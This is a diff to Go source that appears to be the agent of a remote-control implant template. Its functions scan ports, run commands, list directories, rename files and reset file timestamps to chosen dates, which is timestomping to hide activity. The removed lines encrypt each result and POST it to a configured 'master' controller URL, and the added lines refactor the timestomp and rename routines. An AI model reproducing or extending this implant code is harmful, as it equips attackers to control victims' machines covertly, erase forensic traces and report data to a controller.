@@ -378,7 +378,10 @@ func send() { //发送头部信息
             if len(port_list) > 65535 {
                 return
             }
-            sleep_time, _ := strconv.Atoi(delay)
+            sleep_time, err := strconv.Atoi(delay)
+			if err != nil || sleep_time <= 0 {
+	            return
+	        }
             if option == "port" {
                 for _, port := range port_list {
                     time.Sleep(time.Duration(sleep_time) * time.Second)
@@ -740,54 +743,37 @@ func send() { //发送头部信息
     func Command(cmd string) string {
         /*os_str*/
     }
-    func CHANG_FILE_TIME(cmd, newTime string) {
-        var str string
-        info, err := os.Stat(cmd)
-        if err != nil || info.IsDir() {
-            str = "CHANG_FILE_TIME^ file not found or is a directory"
-        } else {
-            cleanTime := strings.ReplaceAll(strings.TrimSpace(newTime), "\r", "")
-            modTime, err := time.Parse("2006-01-02 15:04:05", cleanTime)
-            if err != nil {
-                str = "CHANG_FILE_TIME^ invalid time format"
-            } else {
-                if err := os.Chtimes(cmd, modTime, modTime); err != nil {
-                    str = "CHANG_FILE_TIME^ failed to change file time: " + err.Error()
-                } else {
-                    str = "CHANG_FILE_TIME^" + newTime
-                }
-            }
-        }
-        fileKey := get_encry_s(&str)
-        data := map[string]string{
-            "/*uid*/":    uid,
-            "/*result*/": fileKey,
-        }
-        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
-        post(data, re_url)
-    }
-    func CHANG_FILE_NAME(cmd, newName string) {
-        var str string
-        if _, err := os.Stat(cmd); os.IsNotExist(err) {
-            str = "CHANG_FILE_NAME^ file not found"
-        } else {
-            dir := filepath.Dir(cmd)
-            newPath := filepath.Join(dir, newName)
-
-            if err := os.Rename(cmd, newPath); err != nil {
-                str = "CHANG_FILE_NAME^ failed to rename file: " + err.Error()
-            } else {
-                str = "CHANG_FILE_NAME^" + newName
-            }
-        }
-        fileKey := get_encry_s(&str)
-        data := map[string]string{
-            "/*uid*/":    uid,
-            "/*result*/": fileKey,
-        }
-        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
-        post(data, re_url)
-    }
+    func ChangeFileTime(cmd, newTime string){
+	    info, err := os.Stat(cmd)
+	    if err != nil {
+	        return
+	    }
+	    if info.IsDir() {
+	        return
+	    }
+	    cleanTime := strings.ReplaceAll(strings.TrimSpace(newTime), "\r", "")
+	    modTime, err := time.Parse("2006-01-02 15:04:05", cleanTime)
+	    if err != nil {
+	        return
+	    }
+	    if err := os.Chtimes(cmd, modTime, modTime); err != nil {
+	        return
+	    }
+	    return
+	}
+	
+	// 修改文件名
+	func ChangeFileName(cmd, newName string) {
+	    if _, err := os.Stat(cmd); os.IsNotExist(err) {
+	        return
+	    }
+	    dir := filepath.Dir(cmd)
+	    newPath := filepath.Join(dir, newName)
+	    if err := os.Rename(cmd, newPath); err != nil {
+	        return
+	    }
+	    return
+	}
     func listDir(cmd, file_url,taskid string) {
         var fileNames string
         files, _ := ioutil.ReadDir(cmd)
